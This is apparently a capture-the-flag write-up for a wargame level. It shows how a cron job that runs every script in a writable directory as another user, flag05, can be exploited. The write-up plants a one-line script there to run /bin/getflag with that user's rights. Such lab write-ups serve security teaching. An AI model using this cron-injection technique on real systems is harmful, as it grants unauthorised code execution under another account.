# Level 05

On connection: You have new mail.
Mail are hosted on `/var/spool/mail`.

```sh
$ cat /var/spool/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
It's a crontab configuration who execute every two minutes the shell script in `/usr/sbin/openarenaserver` as flag05.

```sh
$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Let's inject our own script.
```sh
$ echo "exec /bin/getflag > /tmp/soluc" > /opt/openarenaserver/inject.sh
```

And after few minutes we can read `/tmp/soluc`
```sh
$ cat /tmp/soluc
```